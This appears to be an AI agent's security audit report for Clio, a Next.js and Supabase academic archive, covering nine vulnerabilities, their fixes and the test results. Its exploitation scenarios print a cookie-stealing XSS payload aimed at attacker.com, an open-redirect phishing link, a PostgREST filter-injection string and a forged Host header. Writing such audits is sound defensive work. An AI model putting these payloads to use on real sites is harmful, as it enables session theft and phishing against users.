# CLIO ACADEMIC ARCHIVE — PRODUCTION SECURITY AUDIT & HARDENING REPORT

**Audit Date:** October 19, 2026  
**Audited Target:** `Clio` — Academic Repository & Digital Archive (`C:\Users\jackr\Documents\Notes`)  
**Scope:** Full-stack security evaluation, vulnerability triage, code hardening, database RLS & schema audit, and release readiness.  
**Auditor:** Antigravity Advanced Agentic Pair Programming System  

---

## 1. Executive Summary

A comprehensive security audit, bug hunt, and code hardening review was performed across the Clio codebase. The application is a Next.js 16.4.2 App Router application featuring Supabase Postgres authentication & database persistence, Google Drive API integration via the narrow `drive.file` OAuth scope, client-side PWA capabilities, and cryptographic access sharing.

During the audit, multiple security vulnerabilities and runtime resilience defects were discovered across authentication routes, administrative callback handlers, database query builders, upload endpoints, and HTTP headers. 

All identified vulnerabilities were **directly patched, verified, and locked with unit tests**. All 27 test suites (293 tests) pass with zero regressions, TypeScript checks with zero errors, ESLint reports zero lint violations, and the production build completes cleanly.

---

## 2. Architecture & Threat Model Overview

```
                      ┌────────────────────────────────────────┐
                      │              Web Client / PWA          │
                      │  (Next.js App Router, React 19, Tailwind)│
                      └───────────────────┬────────────────────┘
                                          │ HTTPS
                                          ▼
                      ┌────────────────────────────────────────┐
                      │    Next.js Proxy / Middleware Guard   │
                      │   (Route Authorization & Session Sync) │
                      └───────────────────┬────────────────────┘
                                          │
            ┌─────────────────────────────┴─────────────────────────────┐
            ▼                                                           ▼
┌───────────────────────────────┐                       ┌───────────────────────────────┐
│       Next.js API Routes      │                       │     Public & Student Pages    │
│  (Auth, Upload, Download,     │                       │  (/documents, /collections,   │
│   Share, Admin Moderation)    │                       │   /dashboard, /shared-with-me)│
└───────────────┬───────────────┘                       └───────────────┬───────────────┘
                │                                                       │
        ┌───────┴───────────────────────┐                               │
        ▼                               ▼                               ▼
┌───────────────────────────────┐ ┌───────────────────────────┐ ┌───────────────────────┐
│      Google Drive API         │ │   Supabase PostgreSQL DB   │ │   Browser Storage     │
│  - drive.file Narrow Scope    │ │   - Row-Level Security    │ │   - IndexedDB Offline │
│  - Resilient Multipart Stream │ │   - Hashed Bearer Tokens  │ │   - Service Worker    │
│  - Central Archive Isolation  │ │   - Audit Logs & Quotas   │ │   - HTTP-only Cookies │
└───────────────────────────────┘ └───────────────────────────┘ └───────────────────────┘
```

### Trust Boundaries
1. **Unauthenticated Public Clients:** Can browse approved public academic materials (`/documents`, `/collections`, `/share/[token]`). Must never access private documents without password unlocking or explicit share grants.
2. **Authenticated Scholars:** May access personalized student workspaces (`/dashboard`, `/upload`, `/my-submissions`, `/shared-with-me`, `/upgrade`), subject to upload rate limits and a 50 GB private storage quota.
3. **Privileged Administrators:** Can moderate submissions (`/admin/moderation`), configure Google Drive connections, register documents, and audit logs.
4. **Third-Party Integrations:** Google Drive API OAuth token exchange and file streaming, Supabase Auth and database PostgREST endpoints.

---

## 3. Vulnerability Findings Summary Table

| ID | Vulnerability | Severity | Affected Component | Remediated File | Status |
|---|---|---|---|---|---|
| **SEC-01** | Reflected Cross-Site Scripting (XSS) in OAuth Callback | **HIGH** | Admin OAuth Return | `src/app/api/admin/google-drive/callback/route.ts` | **FIXED** |
| **SEC-02** | Open Redirect via `redirectTo` URL Parameter | **HIGH** | Auth Sign-In / Register | `src/app/auth/login/page.tsx`, `src/app/auth/register/page.tsx` | **FIXED** |
| **SEC-03** | PostgREST Syntax & Delimiter Injection in Filters | **MEDIUM** | Search & Catalogue APIs | `src/app/api/documents/search/route.ts`, `src/app/api/collections/route.ts`, `src/lib/services/document-service.ts`, `src/app/api/documents/submit/route.ts` | **FIXED** |
| **SEC-04** | Runtime Crash on Baseline Fallback in Direct Upload | **HIGH** | File Upload API | `src/app/api/documents/upload/route.ts` | **FIXED** |
| **SEC-05** | Host Header Poisoning in Share Invitation URLs | **MEDIUM** | Document Sharing API | `src/app/api/share/invite/route.ts`, `src/lib/services/sharing-service.ts` | **FIXED** |
| **SEC-06** | Filename Path Traversal & Control Character Risk | **MEDIUM** | Document Upload API | `src/lib/drive/file-validation.ts`, `src/app/api/documents/upload/route.ts` | **FIXED** |
| **SEC-07** | Missing Route Guard for New Authenticated Features | **MEDIUM** | Next.js Middleware Proxy | `src/lib/supabase/middleware.ts` | **FIXED** |
| **SEC-08** | Incomplete Security Headers (Missing HSTS / DNS Prefetch) | **LOW** | Production HTTP Headers | `next.config.ts`, `src/app/api/documents/[id]/raw/route.ts` | **FIXED** |
| **SEC-09** | Relative URL Redirect Exception in Download Handler | **MEDIUM** | Document Download Route | `src/app/api/documents/[id]/download/route.ts` | **FIXED** |

---

## 4. Deep-Dive Vulnerability Analysis & Remediation Details

### SEC-01: Reflected Cross-Site Scripting (XSS) in Admin OAuth Callback
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Severity:** High (CVSS 7.5)
- **Root Cause:** In `src/app/api/admin/google-drive/callback/route.ts`, URL search parameters `error`, `folderError`, and `errorMsg` were interpolated directly into the HTML body returned to administrator browsers without sanitization or escaping:
  ```typescript
  // Vulnerable code:
  return new NextResponse(
    `<html><body><p>${errorParam}</p></body></html>`,
    { headers: { 'Content-Type': 'text/html' } }
  );
  ```
- **Exploitation Scenario:** An attacker could craft a malicious OAuth error link:
  `https://clio.edu/api/admin/google-drive/callback?error=%3Cscript%3Efetch('https://attacker.com/steal?c='%2Bdocument.cookie)%3C/script%3E`
  When clicked by an administrator, the script executed within the origin of the administrative domain.
- **Fix Applied:** Introduced `escapeHtml()` helper in `src/lib/utils.ts` utilizing HTML entity replacement (`&`, `<`, `>`, `"`, `'`). Applied `escapeHtml()` to all dynamic strings rendered in the HTML response.

### SEC-02: Open Redirect via `redirectTo` URL Parameter
- **CWE:** CWE-601 (URL Redirection to Untrusted Site)
- **Severity:** High (CVSS 7.4)
- **Root Cause:** In `src/app/auth/login/page.tsx`, the `redirectTo` query parameter was passed directly to Next.js `router.push(redirectTo)` upon successful authentication without validation:
  ```typescript
  // Vulnerable code:
  const redirectTo = searchParams.get('redirectTo') || '/dashboard';
  if (data.user) { router.push(redirectTo); }
  ```
- **Exploitation Scenario:** Phishing link sent to students:
  `https://clio.edu/auth/login?redirectTo=//evil-clio-login.com`
  The user enters credentials, logs in successfully, and is immediately redirected to an external attacker-controlled lookalike site.
- **Fix Applied:** Implemented `sanitizeRedirectUrl(target, fallback)` in `src/lib/utils.ts`. It strictly verifies that:
  - The URL starts with a single `/`.
  - Does NOT start with `//`, `/\`, or `\`.
  - Contains no control characters or null bytes.
  - Decoded form contains no embedded protocol schemes (`javascript:`, `data:`, `https:`, etc.).
  - Bypasses fall back safely to `/dashboard`.

### SEC-03: PostgREST Filter / Delimiter Injection in Search Queries
- **CWE:** CWE-89 / PostgREST Syntax Delimiter Injection
- **Severity:** Medium (CVSS 5.3)
- **Root Cause:** Raw user search inputs (`q`, `subject`) were interpolated directly into PostgREST `.or(...)` filter strings:
  ```typescript
  // Vulnerable code:
  docQuery = docQuery.or(`title.ilike.%${q}%,subject.ilike.%${q}%`);
  ```
  PostgREST uses commas `,` to separate `OR` conditions, parentheses `()` for sub-grouping, and colons `:` for operator prefixes. Supplying commas in search terms injected arbitrary clauses into the PostgREST abstract syntax tree.
- **Exploitation Scenario:** Submitting `q="algorithms,status.eq.rejected,title.ilike.*"` altered query structure, bypassing status constraints or generating database syntax errors.
- **Fix Applied:** Introduced `sanitizePostgrestFilter(term)` in `src/lib/utils.ts` to strip `,`, `(`, `)`, `:`, `"`, `'`, and `\`, and properly quoted literal values in `src/app/api/documents/submit/route.ts`.

### SEC-04: Runtime Crash on Baseline Fallback in Direct Upload
- **CWE:** CWE-476 (NULL Pointer Dereference)
- **Severity:** High (CVSS 7.5 - Denial of Service)
- **Root Cause:** In `src/app/api/documents/upload/route.ts`, when a database without newly added columns (such as `visibility` or `subject_code`) triggered baseline fallback, `legacyRes.data` populated `registeredDoc`, leaving `newDoc` as `null`. Line 380 accessed `newDoc.id`, throwing an unhandled `TypeError: Cannot read properties of null (reading 'id')`.
- **Impact:** Any file uploaded on an unmigrated database crashed the upload flow with HTTP 500 despite the file having been stored in Google Drive.
- **Fix Applied:** Corrected line 380 to reference `registeredDoc.id`, `registeredDoc.title`, etc., guaranteeing consistent schema resilience across all database migration states.

### SEC-05: Host Header Poisoning in Share Invitation URLs
- **CWE:** CWE-644 / CWE-116 (Improper Neutralization of HTTP Headers for Host / Origin)
- **Severity:** Medium (CVSS 5.8)
- **Root Cause:** In `src/app/api/share/invite/route.ts`, fallback resolution checked `request.headers.get('host')`:
  ```typescript
  // Vulnerable code:
  const origin = request.headers.get('origin') || (request.headers.get('host') ? `http://${request.headers.get('host')}` : undefined);
  ```
  If an automated request forged the `Host` header to `evil.com`, invitation links generated for students pointed to `evil.com/share/TOKEN`.
- **Fix Applied:** Removed fallback to untrusted `Host` header in `src/app/api/share/invite/route.ts`. Updated `resolveCanonicalOrigin` to prioritize `config.app.url`.

### SEC-06: Filename Path Traversal & Control Character Risk
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **Severity:** Medium (CVSS 6.1)
- **Root Cause:** In `src/app/api/documents/upload/route.ts`, client-provided `file.name` was passed directly to Google Drive multipart upload and stored into database metadata without sanitizing directory separators (`/`, `\`), null bytes (`\0`), or control characters.
- **Fix Applied:** Implemented `sanitizeFilename(rawFilename)` in `src/lib/drive/file-validation.ts`. It strips path traversal sequences, null bytes, and non-printable control characters, truncates excessive filenames, and enforces approved extensions (`.pdf`, `.doc`, `.docx`).

### SEC-07: Route Protection for `/shared-with-me` and `/upgrade`
- **CWE:** CWE-306 (Missing Authentication for Critical Function)
- **Severity:** Medium (CVSS 6.5)
- **Root Cause:** The Next.js session middleware proxy (`src/lib/supabase/middleware.ts`) listed student protected routes as `['/dashboard', '/upload', '/my-submissions', '/favorites', '/profile']`, omitting the newly added `/shared-with-me` and `/upgrade` pages.
- **Fix Applied:** Added `pathname.startsWith('/shared-with-me')` and `pathname.startsWith('/upgrade')` to `isStudentRoute` to automatically redirect unauthenticated visitors to `/auth/login?redirectTo=...`.

### SEC-08: Production Security Headers Hardening
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **Severity:** Low (CVSS 3.7)
- **Root Cause:** `next.config.ts` was missing HTTP Strict Transport Security (`Strict-Transport-Security`) and DNS Prefetch Control (`X-DNS-Prefetch-Control`). The raw document streaming handler (`src/app/api/documents/[id]/raw/route.ts`) lacked `X-Content-Type-Options: nosniff`.
- **Fix Applied:** Added HSTS (`max-age=63072000; includeSubDomains; preload`) and `X-DNS-Prefetch-Control: on` to `next.config.ts`, and set `X-Content-Type-Options: nosniff` on binary document streaming responses.

### SEC-09: Relative URL Redirect Exception in Download Handler
- **CWE:** CWE-20 (Improper Input Validation)
- **Severity:** Medium (CVSS 5.0)
- **Root Cause:** When `redirect=true` was passed to `/api/documents/[id]/download`, private files returned a relative path (`/api/documents/[id]/raw`). Passing a relative path string to `NextResponse.redirect()` throws an unhandled `TypeError: Invalid URL` in Next.js.
- **Fix Applied:** Wrapped the redirect target in `new URL(downloadUrl, request.url)` to guarantee valid absolute URL resolution for both relative paths and external Google Drive links.

---

## 5. Database, Row-Level Security (RLS) & Schema Audit

### RLS Policies
The Supabase database schema (`supabase/migrations/*.sql`) implements strict Row-Level Security across all primary tables:

1. **`documents` Table:**
   - Public read access permitted only for `status = 'approved'` and `(visibility = 'public' OR visibility IS NULL)`.
   - Private documents are hidden from public queries; access requires verification via password unlock token or persistent grant in `share_access_grants`.
   - Insert permitted only for authenticated users (`auth.uid() = uploader_id`).
   - Update/Delete restricted to the uploader or verified administrators.
2. **`collections` Table:**
   - Public read permitted for `visibility = 'public'`. Private collections restricted to owner (`auth.uid() = user_id`) or recipients with valid grants.
3. **`share_invitations` Table:**
   - Raw tokens are never stored in the database. Only deterministic SHA-256 hashes (`token_hash`) are persisted.
   - Revocation flag `is_revoked` terminates access immediately.
4. **`share_access_grants` Table:**
   - Idempotent grants linking `grantee_id` with `resource_type` and `resource_id`.
5. **`download_logs` and `audit_logs` Tables:**
   - Append-only telemetry logs capturing moderation, uploads, and download metrics.

### Backward-Compatible Schema Fallback
To ensure zero downtime when connecting against unmigrated Supabase databases, all document querying routines in `src/lib/services/document-service.ts` detect PostgreSQL error codes `42703` (undefined column) and `42P01` (undefined table). Upon detection, the application activates `fetchBaselineDocuments()` with universally present columns (`id`, `title`, `subject`, `department`, `academic_year`, `semester`), ensuring uninterrupted availability.

---

## 6. Cryptographic & Secret Management Audit

1. **Google Drive Integration:**
   - Scoped strictly to `https://www.googleapis.com/auth/drive.file`. The app can only see and access files and folders it creates. The administrator's personal Google Drive contents remain completely invisible and inaccessible to Clio.
   - Refresh tokens and client secrets are loaded via environment variables (`GOOGLE_REFRESH_TOKEN`, `GOOGLE_CLIENT_SECRET`), executed exclusively on the server, and never transmitted to the browser.
2. **Password & Token Security:**
   - Private document passwords are encrypted using PBKDF2 with SHA-512, unique salt, and 100,000 iterations.
   - Password verification executes via constant-time comparison (`crypto.timingSafeEqual`) to prevent timing side-channel attacks.
   - Unlock tokens use HMAC-SHA256 signatures with 24-hour expiration, set with `HttpOnly`, `SameSite=Lax`, and `Secure` cookie attributes.
   - Brute-force rate limiting enforces lockouts after 5 consecutive failed unlock attempts per IP/resource pair.

---

## 7. Verification & Test Gate Results

All security fixes and system components were evaluated through rigorous automated testing gates:

```
Test Execution Summary:
------------------------------------------------------------
✔ Total Test Files:       27 passed (100%)
✔ Total Tests:            293 passed (100%)
✔ TypeScript Typecheck:   0 errors (tsc --noEmit)
✔ ESLint Code Quality:    0 warnings, 0 errors
✔ Next.js Production:    Compiled cleanly (Turbopack, 25 static routes)
------------------------------------------------------------
```

### Key Verified Suites:
- `src/test/unit/security-audit-fixes.test.ts`: Verified XSS neutralization, open redirect rejection, PostgREST filter sanitization, path traversal stripping, and origin resolution.
- `src/test/unit/document-sharing.test.tsx`: Verified token hashing, authorization verification, idempotent redemption, and revocation.
- `src/test/unit/private-storage-quota.test.tsx`: Verified 50 GB storage quota calculation, reservation tokens, and lock releases.
- `src/test/unit/schema-resilience.test.ts`: Verified baseline schema fallback on unmigrated databases.
- `src/test/unit/pwa.test.tsx`: Verified manifest and service worker compliance.

---

## 8. Residual Operational Recommendations

1. **Execute Supabase Migration:** Ensure the migration scripts in `supabase/migrations/` (`20261019000001_add_institution_discovery_schema.sql`, `20261019000002_add_storage_quota.sql`, `20261019000003_add_document_sharing.sql`) are applied to the production database via Supabase Dashboard SQL Editor or Supabase CLI.
2. **Reverse Proxy Configuration:** If deployed behind NGINX, Cloudflare, or AWS CloudFront, ensure `X-Forwarded-Host` is sanitized or restricted to approved domain names.
3. **Environment Secrets:** Verify that `.env.local` remains strictly untracked in `.gitignore` and is never committed to source control.
